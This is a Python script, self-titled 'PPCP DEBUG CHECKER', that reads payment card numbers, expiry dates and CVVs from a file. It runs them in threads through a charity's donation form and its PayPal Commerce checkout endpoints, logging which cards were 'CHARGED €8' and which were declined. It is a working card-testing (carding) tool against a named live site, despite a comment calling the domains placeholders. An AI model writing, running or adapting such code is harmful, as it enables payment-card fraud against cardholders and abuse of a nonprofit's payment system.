import base64
import random
import datetime
import requests
from queue import Queue
import threading
import json

# =========================
# Helpers
# =========================

def get_random_ua():
    return random.choice([
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
        "Mozilla/5.0 (X11; Linux x86_64)"
    ])

def lr(text, left, right):
    try:
        return text.split(left, 1)[1].split(right, 1)[0]
    except Exception:
        return ""

# =========================
# PLACEHOLDER DOMAINS ONLY
# =========================

BASE_SITE = "https://africanconservation.org"
PAYMENTS_SITE = "https://cors.api.paypal.com"
ASSETS_SITE = "https://assets.braintreegateway.com/"

FORM_URL = f"{BASE_SITE}/give/donation-form?giveDonationFormInIframe=1"
CREATE_ORDER_URL = f"{BASE_SITE}/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order"
CONFIRM_URL_TMPL = f"{PAYMENTS_SITE}/v2/checkout/orders/{{id}}/confirm-payment-source"
APPROVE_URL_TMPL = f"{BASE_SITE}/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={{id}}"

# =========================
# PPCP FLOW WITH DEBUG
# =========================

def run(cc, mes, ano, cvv, debug=True):
    ua = get_random_ua()
    dd = datetime.datetime.now().strftime("%d")

    # year logic
    if len(ano) == 2:
        anox = f"20{ano}"
    else:
        anox = ano

    s = requests.Session()

    # ---- STEP 1: GET TOKEN ----
    if debug:
        print(f"\n{'='*60}")
        print(f"[STEP 1] GET TOKEN")
        print(f"[URL] {FORM_URL}")

    try:
        r1 = s.get(
            FORM_URL,
            headers={
                "User-Agent": ua,
                "Pragma": "no-cache",
                "Accept": "*/*"
            },
            timeout=30
        )
        if debug:
            print(f"[STATUS] {r1.status_code}")
            print(f"[RESPONSE LENGTH] {len(r1.text)} chars")
    except Exception as e:
        if debug:
            print(f"[ERROR] {e}")
        return f"{cc}|{mes}|{anox}|{cvv} -> ERROR STEP1: {e}"

    sec = lr(r1.text, 'token":"', '","')
    token = ""
    if sec:
        try:
            dec = base64.b64decode(sec).decode(errors="ignore")
            token = lr(dec, 'accessToken":"', '"')
            if debug:
                print(f"[TOKEN] {token[:60]}..." if len(token) > 60 else f"[TOKEN] {token}")
        except Exception as e:
            if debug:
                print(f"[TOKEN DECODE ERROR] {e}")
    else:
        if debug:
            print("[TOKEN] NOT FOUND IN RESPONSE")
            print(f"[RAW RESPONSE PREVIEW]\n{r1.text[:800]}")

    # ---- STEP 2: CREATE ORDER ----
    if debug:
        print(f"\n{'='*60}")
        print(f"[STEP 2] CREATE ORDER")
        print(f"[URL] {CREATE_ORDER_URL}")

    files = {
        "give-honeypot": (None, ""),
        "give-form-id-prefix": (None, "25344-1"),
        "give-form-id": (None, "25344"),
        "give-form-title": (None, "Donation Form"),
        "give-current-url": (None, f"{BASE_SITE}/donate/"),
        "give-form-url": (None, f"{BASE_SITE}/give/donation-form/"),
        "give-form-minimum": (None, "8"),
        "give-form-maximum": (None, "1000000"),
        "give-form-hash": (None, "9a19e98e0d"),
        "give-price-id": (None, "custom"),
        "give-amount": (None, "8"),
        "give_first": (None, "xyros"),
        "give_last": (None, "wayne"),
        "give_email": (None, "test@example.test"),
        "payment-mode": (None, "paypal-commerce"),
        "card_name": (None, "xyros op"),
        "give-gateway": (None, "paypal-commerce"),
        "give_embed_form": (None, "1"),
    }

    try:
        r2 = s.post(
            CREATE_ORDER_URL,
            files=files,
            headers={
                "User-Agent": ua,
                "Pragma": "no-cache",
                "Accept": "*/*"
            },
            timeout=30
        )
        if debug:
            print(f"[STATUS] {r2.status_code}")
            print(f"[RAW RESPONSE]\n{r2.text}")
    except Exception as e:
        if debug:
            print(f"[ERROR] {e}")
        return f"{cc}|{mes}|{anox}|{cvv} -> ERROR STEP2: {e}"

    try:
        r2_json = r2.json()
        order_id = r2_json.get("id", "")
        if debug:
            print(f"[ORDER ID] {order_id}")
        if not order_id:
            if debug:
                print("[ERROR] No order ID in response")
            return f"{cc}|{mes}|{anox}|{cvv} -> ERROR: No order ID"
    except Exception as e:
        if debug:
            print(f"[JSON ERROR] {e}")
        return f"{cc}|{mes}|{anox}|{cvv} -> ERROR STEP2 JSON: {e}"

    # ---- STEP 3: CONFIRM PAYMENT SOURCE ----
    confirm_url = CONFIRM_URL_TMPL.format(id=order_id)
    if debug:
        print(f"\n{'='*60}")
        print(f"[STEP 3] CONFIRM PAYMENT SOURCE")
        print(f"[URL] {confirm_url}")

    confirm_payload = {
        "payment_source": {
            "card": {
                "number": cc,
                "expiry": f"{anox}-{mes}",
                "security_code": cvv,
                "attributes": {
                    "verification": {
                        "method": "SCA_WHEN_REQUIRED"
                    }
                }
            }
        },
        "application_context": {
            "vault": False
        }
    }

    if debug:
        masked = f"{cc[:6]}******{cc[-4:]}" if len(cc) > 10 else "****"
        print(f"[CARD] {masked}|{mes}|{anox}|***")

    try:
        r3 = s.post(
            confirm_url,
            json=confirm_payload,
            headers={
                "authorization": f"Bearer {token}",
                "braintree-sdk-version": "3.32.0-payments-sdk-dev",
                "origin": ASSETS_SITE,
                "referer": f"{ASSETS_SITE}/",
                "user-agent": ua,
                "Content-Type": "application/json"
            },
            timeout=30
        )
        if debug:
            print(f"[STATUS] {r3.status_code}")
            print(f"[RAW RESPONSE]\n{r3.text}")
    except Exception as e:
        if debug:
            print(f"[ERROR] {e}")
        return f"{cc}|{mes}|{anox}|{cvv} -> ERROR STEP3: {e}"

    # Parse response
    status = "UNKNOWN"
    country = "XX"
    decline_reason = ""
    
    try:
        j3 = r3.json()
        if debug:
            print(f"[PARSED JSON]\n{json.dumps(j3, indent=2)}")
        
        status = j3.get("status", "UNKNOWN")
        
        # Try multiple paths for country code
        country = j3.get("bin_country_code", "")
        if not country:
            # Check in payment_source.card
            ps = j3.get("payment_source", {})
            card = ps.get("card", {})
            country = card.get("bin_country_code", "XX")
        
        # Get decline reason from details
        if "details" in j3:
            details = j3["details"]
            if isinstance(details, list) and len(details) > 0:
                decline_reason = details[0].get("issue", "") or details[0].get("description", "")
        
        # Get error message
        if "message" in j3:
            if not decline_reason:
                decline_reason = j3["message"]
        
        # Get error name
        if "name" in j3:
            error_name = j3["name"]
            if debug:
                print(f"[ERROR NAME] {error_name}")
                
    except Exception as e:
        if debug:
            print(f"[JSON PARSE ERROR] {e}")

    if debug and decline_reason:
        print(f"[DECLINE REASON] {decline_reason}")

    # ---- STEP 4: APPROVE ORDER ----
    approve_url = APPROVE_URL_TMPL.format(id=order_id)
    if debug:
        print(f"\n{'='*60}")
        print(f"[STEP 4] APPROVE ORDER")
        print(f"[URL] {approve_url}")

    try:
        r4 = s.post(
            approve_url,
            files=files,
            headers={
                "User-Agent": ua,
                "Pragma": "no-cache",
                "Accept": "*/*"
            },
            timeout=30
        )
        if debug:
            print(f"[STATUS] {r4.status_code}")
            print(f"[RAW RESPONSE]\n{r4.text}")
    except Exception as e:
        if debug:
            print(f"[ERROR] {e}")
        return f"{cc}|{mes}|{anox}|{cvv} -> ERROR STEP4: {e}"

    # Parse final response
    success = False
    final_error = ""
    
    try:
        r4_json = r4.json()
        if debug:
            print(f"[PARSED JSON]\n{json.dumps(r4_json, indent=2)}")
        
        success = r4_json.get("success", False)
        
        if not success:
            # Try to get error message
            final_error = r4_json.get("message", "")
            if not final_error:
                final_error = r4_json.get("error", "")
            if not final_error and "data" in r4_json:
                final_error = r4_json["data"].get("message", "")
                
    except Exception as e:
        if debug:
            print(f"[JSON PARSE ERROR] {e}")

    # ---- BUILD RESULT ----
    label = "CHARGED €8 🔥" if success else "DECLINED ❌"
    
    # Build detailed result
    if success:
        result = f"{cc}|{mes}|{anox}|{cvv} -> success : true - {country} - {label}"
    else:
        extra = decline_reason or final_error or status
        result = f"{cc}|{mes}|{anox}|{cvv} -> success : false - {country} - {label} [{extra}]"

    if debug:
        print(f"\n{'='*60}")
        print(f"[FINAL RESULT] {result}")
        print(f"{'='*60}\n")

    with open(f"ppch{dd}.txt", "a", encoding="utf-8") as f:
        f.write(result + "\n")

    return result

# =========================
# MASS cc.txt RUNNER
# =========================

def mass_run(cc_file="cc.txt", threads=5, debug=True):
    q = Queue()

    try:
        with open(cc_file, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if "|" in line:
                    q.put(line)
    except FileNotFoundError:
        print(f"[ERROR] File '{cc_file}' not found!")
        return

    if q.empty():
        print(f"[ERROR] No valid cards in '{cc_file}'")
        return

    print(f"[INFO] Loaded {q.qsize()} cards from {cc_file}")
    print(f"[INFO] Debug mode: {debug}")

    def worker():
        while True:
            try:
                line = q.get_nowait()
                parts = line.split("|", 3)
                if len(parts) != 4:
                    print(f"[SKIPPED] Bad format: {line}")
                    q.task_done()
                    continue

                cc, mes, ano, cvv = parts
                res = run(cc, mes, ano, cvv, debug=debug)
                if not debug:
                    print(res)

            except Exception as e:
                if "Empty" in str(type(e).__name__):
                    break
                print(f"[ERROR] {e}")
            finally:
                try:
                    q.task_done()
                except:
                    pass

    for _ in range(threads):
        threading.Thread(target=worker, daemon=True).start()

    q.join()


# =========================
# CLI
# =========================

if __name__ == "__main__":
    import sys
    
    print("\n" + "="*60)
    print("  PPCP DEBUG CHECKER - Real API Response Mode")
    print("="*60)
    
    if len(sys.argv) > 1:
        arg = sys.argv[1]
        
        # Check if it's a single card
        if "|" in arg and arg.count("|") == 3:
            parts = arg.split("|", 3)
            cc, mes, ano, cvv = parts
            print(f"\n[SINGLE CARD TEST]")
            run(cc, mes, ano, cvv, debug=True)
        else:
            # Treat as file
            debug_mode = "--no-debug" not in sys.argv
            mass_run(arg, threads=1, debug=debug_mode)
    else:
        mass_run("cc.txt", threads=1, debug=True)
